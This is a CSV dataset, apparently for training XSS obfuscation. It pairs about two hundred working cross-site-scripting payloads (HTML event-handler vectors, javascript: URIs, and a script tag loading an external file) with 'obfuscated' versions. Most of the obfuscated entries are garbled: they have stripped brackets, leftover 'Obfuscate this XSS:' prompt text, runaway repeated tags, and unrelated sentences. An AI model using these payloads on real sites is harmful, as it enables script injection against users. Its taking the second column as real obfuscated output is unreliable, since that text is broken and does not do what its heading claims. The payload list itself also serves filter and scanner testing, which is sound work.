original,ofuscado
<ul onpointerup=alert(1)>xss</ul>,XSS: ul onpointerup=alert(1)>xss/ul>.
<u onpointerout=alert(1)>xss</u>,Obfuscate this XSS: u onpointerout=alert(1)>xss/u>
"<applet draggable=""true"" ondragstart=""alert(1)"">test</applet>",": applet draggable=""true"" ondragstart=""alert(1)"">test/applet>"
"<i oncut=""alert(1)"" contenteditable>test</i>","/i> i oncut=""alert(1)"" contenteditable>test/i>"
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationstart=""alert(1)""></figure>",": style=""animation-name:x"" onanimationstart=""alert(1)"">/figure>>/figure>*-style>@keyframes x/style>figure style=""animation-name:x"" onanimationstart=""alert(1)"">/figure>/figure>*-style>/figure>/figure>/figure>>/figure>_ style>>@keyframes x"
"<div draggable=""true"" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>","...>div draggable=""true"" contenteditable>drag me/div>dd ondragover=alert(1) contenteditable>drop here/dd>"
"<title oncontextmenu=""alert(1)"">test</title>",t/title>>test/title>
"<optgroup onmousedown=""alert(1)"">test</optgroup>","Obfuscate this XSS: optgroup onmousedown=""alert(1)"">test/optgroup>"
"<figure onmouseout=""alert(1)"">test</figure>","the XSS: figure onmouseout=""alert(1)"">test/figure>"
"<track onkeydown=""alert(1)"" contenteditable>test</track>","Obfuscate this XSS: track onkeydown=""alert(1)"" contenteditable>test/track>"
<noframes onpointerover=alert(1)>xss</noframes>,frame: noframes onpointerover=alert(1)>xss/noframes> XSS: noframes onpointerover=alert(1)>xss/noframes>
&#x3c,Obfuscate this XSS: &#x3c (a)
"<noscript onkeydown=""alert(1)"" contenteditable>test</noscript>",": noscript onkeydown=""alert(1)"" contenteditable>test/noscript>"
"<blink oncontextmenu=""alert(1)"">test</blink>",": blink oncontextmenu=""alert(1)"">test/blink>"
"<details draggable=""true"" ondragenter=""alert(1)"">test</details>","tests /details>>test/details> XSS: details draggable=""true"" ondragenter=""alert(1)"">test/details>>test/detail>"
"<style>:target {color: red;}</style><noembed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noembed>",": style>:target color: red;/style>noembed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/noembed>"
<form onpointerdown=alert(1)>xss</form>,for XSS: form onpointerdown=alert(1)>xss/form>.
"<option onmouseover=""alert(1)"">test</option>",:>test/option>
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>","=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/option>/option>/option>/option>/option>/option>/option>/option>/option>/option>/option>/option>/option>/option> /option>/option>/option>/option style"
<script onload=alert(1) src=validjs.js></script>,/script>.src=validjs.js>/script>/script>.
"<legend onmouseenter=""alert(1)"">test</legend>","Obfuscate this XSS: legend onmouseenter=""alert(1)"">test/legend>"
"<track onmouseup=""alert(1)"">test</track>","XSS: track onmouseup=""alert(1)"">test/track>"
"<style>:target {color:red;}</style><header id=x style=""transition:color 1s"" ontransitionend=alert(1)></header>","s"" ontransitionend=alert(1)>/header>"
"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",": keygen onkeypress=""alert(1)"" contenteditable>test/keygen>"
<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>,/select>input id=y autofocus>.
"<footer ondblclick=""alert(1)"">test</footer>","footer ondblclick=""alert(1)"">test/footer>"
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,a id=x tab index=1 onbeforeactivate=alert(1)>/a>
"<rb oncontextmenu=""alert(1)"">test</rb>",". Reset this XSS: rb oncontextmenu=""alert(1)"">test/rb>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></abbr>",": target animation:10s ease-in-out 0s 1 x;/style>abbr id=x style=""position:absolute;"" style=""position:absolute;"" onanimationcancel=""alert(1)"">/abbr>"
<dfn onpointerdown=alert(1)>xss</dfn>,Obfuscate this XSS: dfn onpointerdown=alert(1)>xss/dfn>
"<param oncopy=""alert(1)"" contenteditable>test</param>","param oncopy=""alert(1)"" contenteditable>test/param>"
"<element draggable=""true"" ondragleave=""alert(1)"">test</element>",>test/element>>test/element>
<isindex onpointermove=alert(1)>xss</isindex>,XSS: isindex onpointermove=alert(1)>xss/isindex>obfuscate this XSS: isindex onpointermove=alert(1)>xss/isindex>
<var onpointermove=alert(1)>xss</var>,. var onpointermove=alert(1)>xss/var>>
"<ul onclick=""alert(1)"">test</ul>",": ul onclick=""alert(1)"">test/ul>"
"<style>:target {color:red;}</style><thead id=x style=""transition:color 1s"" ontransitionend=alert(1)></thead>","s:/color 1s"" ontransitionend=alert(1)>/thead>."
"<canvas onkeydown=""alert(1)"" contenteditable>test</canvas>",": canvas onkeydown=""alert(1)"" contenteditable>test/canvas>"
<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>,>/output>input id=y autofocus>
"<main onmouseup=""alert(1)"">test</main>",": main onmouseup=""alert(1)"">test/main>"
"<style>:target {color: red;}</style><span id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></span>","=""transition:color 10s"" ontransitioncancel=alert(1)>/span>."
"<p onmousedown=""alert(1)"">test</p>",>test/p>
"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" ontransitionend=alert(1)></keygen>",":color 1s"" ontransitionend=alert(1)>/keygen>"
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationend=""alert(1)""></tbody>","XSS: style>@keyframes x/style>tbody style=""animation-name:x"" onanimationend=""alert(1)"">/tbody>"
"<script a="">'>"" src=""httx://.rocks/.js""></script>","Obvoque this XSS: script a="">'>"" src=""httx://.rocks/.js"">/script>/script>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></select>","style=""position:absolute;"" onanimationcancel=""alert(1)"">/select>>/select>/select>"
<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>,(span onblur=alert(1) tabindex=1 id=x>/span>input autofocus>
"<meter onmouseout=""alert(1)"">test</meter>","Obfuscate this XSS: meter onmouseout=""alert(1)"">test/meter>"
"<dd onbeforepaste=""alert(1)"" contenteditable>test</dd>","dd onbeforepaste=""alert(1)"" contenteditable>test/dd>"
"<ol oncut=""alert(1)"" contenteditable>test</ol>",": ol oncut=""alert(1)"" contenteditable>test/ol>"
"<kbd onmouseenter=""alert(1)"">test</kbd>","-kbd onmouseenter=""alert(1)"">test/kbd>"
"<span onmousedown=""alert(1)"">test</span>","span onmousedown=""alert(1)"">test/span>"
"<svg onkeyup=""alert(1)"" contenteditable>test</svg>","for the XSS:svg onkeyup=""alert(1)"" contenteditable>test/svg>"
<frame onpointerover=alert(1)>xss</frame>,: frame onpointerover=alert(1)>xss/frame>.
"<style>@keyframes slidein {}</style><rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rt>","onanimationiteration=""alert(1)"">/rt>/rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/rt>/rt>/rt>/rt>/rt>/rt>/rt>/rt>/rt>/rt>"
"<area oncontextmenu=""alert(1)"">test</area>",/area>>test/area>.
<wbr onpointerenter=alert(1)>xss</wbr>,XSS: wbr onpointerenter=alert(1)>xss/wbr> xss/wbr>
"<style>:target {color: red;}</style><li id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></li>","class=""transition:color 10s"" ontransitioncancel=alert(1)>/li>"
"<details onmouseup=""alert(1)"">test</details>",that is a valid indicator for a product.
<tbody onpointerleave=alert(1)>xss</tbody>,and let me be a member of this list of other RSSS.
<script onpointerup=alert(1)>xss</script>,that XSS: script onpointerup=alert(1)>xss/script>
"<div draggable=""true"" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>","div draggable=""true"" contenteditable>drag me/div>command ondragover=alert(1) contenteditable>drop here/command>"
"<center onkeyup=""alert(1)"" contenteditable>test</center>","-center onkeyup=""alert(1)"" contenteditable>test/center>"
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationend=""alert(1)""></s>",":>!=""alert(1)"">>"
"<i onmousemove=""alert(1)"">test</i>",": i onmousemove=""alert(1)"">test/i>"
"<label onmouseout=""alert(1)"">test</label>","onmouseout=""alert(1)"">test/label>"
<u id=x tabindex=1 onactivate=alert(1)></u>,x id=x tabindex=1 onactivate=alert (1)>/u>
"<img draggable=""true"" ondragleave=""alert(1)"">test</img>",>test/img>
<bdi onpointermove=alert(1)>xss</bdi>,: bdi onpointermove=alert(1)>xss/bdi>
"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",sd'innocent[]> test/picture>
"<command onbeforecopy=""alert(1)"" contenteditable>test</command>","XSS: command onbeforecopy=""alert(1)"" contenteditable>test/command>"
"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationstart=""alert(1)""></i>",": style>@keyframes x/style>i style=""animation-name:x"" onanimationstart=""alert(1)"">/i>"
"<fieldset onmousemove=""alert(1)"">test</fieldset>",": fieldset onmousemove=""alert(1)"">test/fieldset>"
"<th onmousemove=""alert(1)"">test</th>",": th onmousemove=""alert(1)"">test/th>"
"<font onmousemove=""alert(1)"">test</font>",": font onmousemove=""alert(1)"">test/font>"
"<figure onmouseenter=""alert(1)"">test</figure>","Obfuscate thisXSS: figure onmouseenter=""alert(1)"">test/figure>"
<var onpointerenter=alert(1)>xss</var>,this in two ways: var onpointerenter=alert(1)>xss/var>
"<noscript onpaste=""alert(1)"" contenteditable>test</noscript>","oscript onpaste=""alert(1)"" contenteditable>test/noscript>"
<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>,/form>input autofocus>.
"<frame ondblclick=""alert(1)"">test</frame>",>test/frame>
<colgroup onpointerleave=alert(1)>xss</colgroup>,>: colgroup onpointerleave=alert(1)>xss/colgroup>.
<small id=x tabindex=1 onbeforeactivate=alert(1)></small>,/small>
"<style>@keyframes x{}</style><big style=""animation-name:x"" onanimationend=""alert(1)""></big>","XSS: style>@keyframes x/style>big style=""animation-name:x"" onanimationend=""alert(1)"">/big>."
"<frameset onkeyup=""alert(1)"" contenteditable>test</frameset>",": frameset onkeyup=""alert(1)"" contenteditable>test/frameset>"
<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>,XSS: pre id=x tabindex=1 ondeactivate=alert(1)>/pre>input id=y autofocus>
"<head draggable=""true"" ondragstart=""alert(1)"">test</head>",": head draggable=""true"" ondragstart=""alert(1)"">test/head>"
<bgsound onpointermove=alert(1)>xss</bgsound>,this XSS: bgsound onpointermove=alert(1)>xss/bgsound>
<blink id=x tabindex=1 onfocusin=alert(1)></blink>,: blink id=x tabindex=1 onfocusin=alert(1)>/blink>
"<main onmouseleave=""alert(1)"">test</main>",": main onmouseleave=""alert(1)"">test/main>"
"<acronym onmousedown=""alert(1)"">test</acronym>",...
<discard onpointermove=alert(1)>xss</discard>,s: -discard onpointermove=alert(1)>xss/discard>
"<canvas draggable=""true"" ondragstart=""alert(1)"">test</canvas>",": canvas draggable=""true"" ondragstart=""alert(1)"">test/canvas>"
"<colgroup draggable=""true"" ondragstart=""alert(1)"">test</colgroup>",>test/colgroup>
"<samp onclick=""alert(1)"">test</samp>","! Using the XSS, you must test a test: samp onclick onclick=""alert(1)"">test/samp>"
<data id=x tabindex=1 onfocus=alert(1)></data>,>/data>
"<article onclick=""alert(1)"">test</article>","as article onclick=""alert(1)"">test/article>"
"<datalist onmouseup=""alert(1)"">test</datalist>","::list onmouseup=""alert(1)"">test/datalist>"
<select onpointerover=alert(1)>xss</select>,Opfuscate this XSS: select onpointerover=alert(1)>xss/select>
<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>,the XSS: datalist id=x tabindex=1 onbeforeactivate=alert(1)>/datalist>
"<style>:target {color: red;}</style><dt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dt>","s x style=""transition:color 10s"" ontransitioncancel=alert(1)>/dt>"
"<data onmouseover=""alert(1)"">test</data>",data and the output of the test.
<svg><marquee onload=alert(1)></marquee>,:svg>marquee onload=alert(1)>/marquee>
"<ins onmouseenter=""alert(1)"">test</ins>","ins onmouseenter=""alert(1)"">test/ins> XSS: ins onmouseenter=""alert(1)"">test/ins>"
<center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>,/center>input autofocus>
"<body onmouseenter=""alert(1)"">test</body>","body onmouseenter=""alert(1)"">test/body>"
<textarea onpointerout=alert(1)>xss</textarea>,this XSS: textarea onpointerout=alert(1)>xss/textarea>
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationstart=""alert(1)""></time>","XSS::x=""animation-name:x"" onanimationstart=""alert(1)"">/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>/time>"
"<noscript oncopy=""alert(1)"" contenteditable>test</noscript>",":noscript oncopy=""alert(1)"" contenteditable>test/noscript>"
"<progress draggable=""true"" ondragstart=""alert(1)"">test</progress>","this xSS: progress draggable=""true"" ondragstart=""alert(1)"">test/progress>"
<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>,0 id=x tabindex=1 ondeactivate=alert(1)>
"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>","t format=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/dt>/dt>/dt>/dt>/dt>/dt>/dt>/dt>/dt>/dt>/dt>/dt>/dt style=""animation-duration:"
"<ruby oncut=""alert(1)"" contenteditable>test</ruby>",": ruby oncut=""alert(1)"" contenteditable>test/ruby>"
"<samp onkeyup=""alert(1)"" contenteditable>test</samp>","/samp>:samp onkeyup=""alert(1)"" contenteditable>test/samp>"
"<header draggable=""true"" ondragstart=""alert(1)"">test</header>","XSS: header draggable=""true"" ondragstart=""alert(1)"">test/header>"
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,t id=x tabindex=1 onbeforedeactivate=alert(1)>/xmp>input autofocus>
"<form onmousemove=""alert(1)"">test</form>",": form onmousemove=""alert(1)"">test/form>"
"<rb onmouseout=""alert(1)"">test</rb>","seout=""alert(1)"">test/rb>"
"<script oncut=""alert(1)"" contenteditable>test</script>","script oncut=""alert(1)"" contenteditable>test/script>-"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></p>","::=""position:absolute;"" style=""position:absolute;"" style=""alert(1)"">/p>/p>/p>; style>@keyframes xfromleft:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>p id=x style=""position:absolute;"" onanimation"
<p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>,/p>input id=y autofocus>
"<center onmouseout=""alert(1)"">test</center>","Obfuscate thisXSS: center onmouseout=""alert(1)"">test/center>"
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,: blockquote id=x tabindex=1 onfocusin=alert(1)>/blockquote>
"<track onclick=""alert(1)"">test</track>",": track onclick=""alert(1)"">test/track>"
"<keygen onpaste=""alert(1)"" contenteditable>test</keygen>",": keygen onpaste=""alert(1)"" contenteditable>test/keygen>"
"<textarea draggable=""true"" ondragenter=""alert(1)"">test</textarea>","XSS: textarea draggable=""true"" ondragenter=""alert(1)"">test/textarea>"
"<header onmousemove=""alert(1)"">test</header>",", that is, the new XSS: header onmousemove=""alert(1)"">test/header>"
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,XSS: dfn id=x tabindex=1 onfocus=alert(1)>/dfn>
<wbr onpointerdown=alert(1)>xss</wbr>,Obfuscate this XSS: wbr onpointerdown=alert(1)>xss/wbr>
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationstart=""alert(1)""></spacer>","xS: style>@keyframes x/style>spacer style=""animation-name:x"" onanimationstart=""alert(1)"">/spacer>"
"<noembed onmouseenter=""alert(1)"">test</noembed>","XSS: noembed onmouseenter=""alert(1)"">test/noembed>"
<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>,/applet>input autofocus>.
"<meter onbeforepaste=""alert(1)"" contenteditable>test</meter>","meter meter onbeforepaste=""alert(1)"" contenteditable>test/meter>"
"<dfn draggable=""true"" ondrag=""alert(1)"">test</dfn>",": dfn draggable=""true"" ondrag=""alert(1)"">test/dfn>"
"<em onkeypress=""alert(1)"" contenteditable>test</em>","adget=""alert(1)"" contenteditable>test/em>"
"<button onkeyup=""alert(1)"" contenteditable>test</button>","button onkeyup=""alert(1)"" contenteditable>test/button>"
"<bdo onclick=""alert(1)"">test</bdo>",>/bdo>>test/bdo>
<select autofocus onfocusin=alert(1)>,Autofocus onfocusin=alert(1)>.
"<hgroup onmouseup=""alert(1)"">test</hgroup>","at: hgroup onmouseup=""alert(1)"">test/hgroup>"
<rt onpointerup=alert(1)>xss</rt>,?
"<embed draggable=""true"" ondragend=""alert(1)"">test</embed>","&: embed draggable=""true"" ondragend=""alert(1)"">test/embed>"
<body id=x tabindex=1 onactivate=alert(1)></body>,es. body id=x tabindex=1 onactivate=alert(1)>/body>
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",": div draggable=""true"" contenteditable>drag me/div>label ondragover=alert(1) contenteditable>drop here/label>"
"<frame onkeyup=""alert(1)"" contenteditable>test</frame>","frame onkeyup=""alert(1)"" contenteditable>test/frame>"
<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>,XSS: th id=x tabindex=1 ondeactivate=alert(1)>/th>intr id=y autofocus>
"<noframes draggable=""true"" ondragleave=""alert(1)"">test</noframes>",""">test/noframes>test/noframes>."
"<h1 oncopy=""alert(1)"" contenteditable>test</h1>",>test/h1>
<label id=x tabindex=1 onactivate=alert(1)></label>,: label id=x tabindex=1 onactivate=alert(1)>/label>
"<noframes draggable=""true"" ondragend=""alert(1)"">test</noframes>","the XSS: noframes draggable=""true"" ondragend=""alert(1)"">test/noframes>."
<iframe onpointerout=alert(1)>xss</iframe>,/iframe>? ?
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationstart=""alert(1)""></area>","=""animation-name:x"" onanimationstart=""alert(1)"">/area>/area>/area>/area> XSS: style>@keyframes x/style>area style=""animation-name:x"" onanimationstart=""alert(1)"">/area>/area>/area>/area>/region>/area>/error>/area>/area>/zone>"
"<meta draggable=""true"" ondragenter=""alert(1)"">test</meta>","XSS: meta draggable=""true"" ondragenter=""alert(1)"">test/meta>"
<svg><bdi onload=alert(1)></bdi>,this XSS: svg>bdi onload=alert(1)>/bdi>
<blockquote onpointerover=alert(1)>xss</blockquote>,Obfuscate this XSS: blockquote onpointerover=alert(1)>xss/blockquote>
"<noembed draggable=""true"" ondrag=""alert(1)"">test</noembed>",", noembed draggable=""true"" ondrag=""alert(1)"">test/noembed>"
"<div draggable=""true"" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>",": div draggable=""true"" contenteditable>drag me/div>rp ondrop=alert(1) contenteditable>drop here/rp>"
"<u onmouseleave=""alert(1)"">test</u>",": u onmouseleave=""alert(1)"">test/u>"
"<spacer oncontextmenu=""alert(1)"">test</spacer>",": spacer oncontextmenu=""alert(1)"">test/spacer>"
"<progress onmousedown=""alert(1)"">test</progress>","edown=""alert(1)"">test/progress>"
"<style>:target {color: red;}</style><footer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></footer>",":/style>footer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/footer>"
<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>,/area>input autofocus>
"<div draggable=""true"" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>","s this XSS: div draggable=""true"" contenteditable>drag me/div>a ondragover=alert(1) contenteditable>drop here/a>"
"<em onmouseover=""alert(1)"">test</em>",": em onmouseover=""alert(1)"">test/em>"
<rb onpointerleave=alert(1)>xss</rb>,the time XSS: rb onpointerleave=alert(1)>xss/rb>
<center id=x tabindex=1 ondeactivate=alert(1)></center><input id=y autofocus>,", center id=x tabindex=1 ondeactivate=alert(1)>/center>input id=y autofocus>"
"<meta onbeforepaste=""alert(1)"" contenteditable>test</meta>",/meta>.
"<aside onbeforecut=""alert(1)"" contenteditable>test</aside>",":aside onbeforecut=""alert(1)"" contenteditable>test/aside>"
<img src=javascript:alert('')>,This XSS: img src=javascript:alert('')>Obfuscate this XSS: img src=javascript:alert('')>> img src=javascript:alert('')>>
"<area draggable=""true"" ondrag=""alert(1)"">test</area>",""">test/area>"
"<img src=`javascript:alert(""rsnake says, ''"")`>","XSS: img src=javascript:alert(""rsnake says, ''"")>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
"<textarea draggable=""true"" ondragend=""alert(1)"">test</textarea>","Obfuscate this XSS:textarea draggable=""true"" ondragend=""alert(1)"">test/textarea>"
"<applet onmouseleave=""alert(1)"">test</applet>",": applet onmouseleave=""alert(1)"">test/applet>"
"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>",": div draggable=""true"" contenteditable>drag me/div>head ondragover=alert(1) contenteditable>drop here/head>"
"<div draggable=""true"" contenteditable>drag me</div><audio ondragover=alert(1) contenteditable>drop here</audio>",":og:>>drop here/audio>>>>div draggable=""true"" contenteditable>drag me/div>audio ondragover=alert(1) contenteditable>drop here/audio>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> div draggable=""true"""
"<style onmouseover=""alert(1)"">test</style>","Obfuscate this XSS: style onmouseover=""alert(1)"">test/style>"
<style onpointerout=alert(1)>xss</style>,this XSS: style onpointerout=alert(1)>xss/style>
"<area draggable=""true"" ondragenter=""alert(1)"">test</area>",": area draggable=""true"" ondragenter=""alert(1)"">test/area>"
"<var onclick=""alert(1)"">test</var>",it! /vg/var>
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationend=""alert(1)""></frame>",", please don't forget to add some more info about XSS: XSS: style>@keyframes x/style>frame style=""animation-name:x"" onanimationend=""alert(1)"">/frame>"
<td id=x tabindex=1 onactivate=alert(1)></td>,one onactivate=alert(1)>/td>
<hr onpointerup=alert(1)>xss</hr>,: hr onpointerup=alert(1)>xss/hr>
"<noscript oncontextmenu=""alert(1)"">test</noscript>","this XSS: noscript oncontextmenu=""alert(1)"">test/noscript>"
"<title onbeforepaste=""alert(1)"" contenteditable>test</title>","as title onbeforepaste=""alert(1)"" contenteditable>test/title>"
<svg><area onload=alert(1)></area>,that the XSS is able to accomplish this XSS: svg>area onload=alert(1)>/area>
"<spacer onkeydown=""alert(1)"" contenteditable>test</spacer>",": spacer onkeydown=""alert(1)"" contenteditable>test/spacer>"
"<table ondblclick=""alert(1)"">test</table>",t/table>>test/table>>>test/table>>test/table>
<dialog onpointerleave=alert(1)>xss</dialog>,"(dialog onpointerleave=alert(1)>xss/dialog>/dialog>?>=?/dialog>=l==2>==?/dialog== /dialog>==f r==q==,/dialog>====:>=="
"<ruby onmouseup=""alert(1)"">test</ruby>","if you aren’t a fan of XSS, I would have liked to see the following: ruby onmouseup=""alert(1)"">test/ruby>"
<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>,: mark onblur=alert(1) tabindex=1 id=x>/mark>input autofocus>
"<style>:target {color: red;}</style><picture id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></picture>","s=""tranition:color 10s"" ontransitioncancel=alert(1)>/picture>"
<span onpointerenter=alert(1)>xss</span>,span onpointerenter=alert(1)>xss/span>
"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>",rs>video ondragover=alert(1) contenteditable>drop here/video>
"<samp onkeypress=""alert(1)"" contenteditable>test</samp>",">test/samp>test/samp>test/samp>test/samp>test/samp>test/samp>test XSS: samp onkeypress=""alert(1)"" contenteditable>test/samp>test/samp>test"
"<noembed onbeforepaste=""alert(1)"" contenteditable>test</noembed>","=0: iv_remove_v=6- ___ noembed onbeforepaste=""alert(1)"" contenteditable>test/noembed>"
<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>,>/tbody>input autofocus>
"<isindex onmousedown=""alert(1)"">test</isindex>","isindex onmousedown=""alert(1)"">test/isindex>"
<svg><del onload=alert(1)></del>,: svg>del onload=alert(1)>/del>
"<frameset onkeydown=""alert(1)"" contenteditable>test</frameset>",""" contenteditable>test/frameset>"
"<style>@keyframes x{}</style><a style=""animation-name:x"" onanimationend=""alert(1)""></a>","/a> and:obfuscate this XSS: style>@keyframes x/style>a style=""animation-name:x"" onanimationend=""alert(1)"">/a>>/a>>/a>>* -/a> - style>@keyframes x/style>a style=""animation-name:x"" onanimationend=""alert(1)"">/"
"<iframe draggable=""true"" ondrag=""alert(1)"">test</iframe>",>test/iframe>
"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",": textarea draggable=""true"" ondragstart=""alert(1)"">test/textarea>"
<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>,"sup>input autofocus>,=alert(1) tabindex=1 id=x>/sup>input autofocus> XSS:sup onfocusout=alert(1) tabindex=1 id=x>/sup>input autofocus>"
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationend=""alert(1)""></track>","to the XSS: style>@keyframes x/style>track style=""animation-name:x"" onanimationend=""alert(1)"">/track>"
"<colgroup draggable=""true"" ondragend=""alert(1)"">test</colgroup>",": colgroup draggable=""true"" ondragend=""alert(1)"">test/colgroup>"
"<canvas onmouseleave=""alert(1)"">test</canvas>","XSS: canvas onmouseleave=""alert(1)"">test/canvas>"
"<style onmouseout=""alert(1)"">test</style>","style onmouseout=""alert(1)"">test/style>"
"<style>@keyframes slidein {}</style><tr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tr>","=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/tr>"
<center onpointerleave=alert(1)>xss</center>,Obfuscate this XSS: center onpointerleave=alert(1)>xss/center>.
"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strong>","XSS: style>:target color: red;/style>strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/strong>"
<tt onpointerout=alert(1)>xss</tt>,Obfuscate this XSS: tt onpointerout=alert(1)>xss/tt>
<dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>,/dir>input autofocus>input autofocus>
"<rp onmouseenter=""alert(1)"">test</rp>",:_test/rp>>test/rp>
"<style>:target {color:red;}</style><figure id=x style=""transition:color 1s"" ontransitionend=alert(1)></figure>","line=""transition:color 1s"" ontransitionend=alert(1)>/figure>"
<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,: plaintext id=x tabindex=1 onfocus=alert(1)>/plaintext>
"<option onbeforecut=""alert(1)"" contenteditable>test</option>","Obfuscate thisXSS: option onbeforecut=""alert(1)"" contenteditable>test/option>"
<image id=x tabindex=1 onbeforeactivate=alert(1)></image>,: image id=x tabindex=1 onbeforeactivate=alert(1)>/image>
"<style>:target {transform: rotate(180deg);}</style><colgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></colgroup>","/style>colgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/colgroup>/colgroup>-type=""transition:transform 2s"" petransitionrun=alert(1)>/colgroup>"
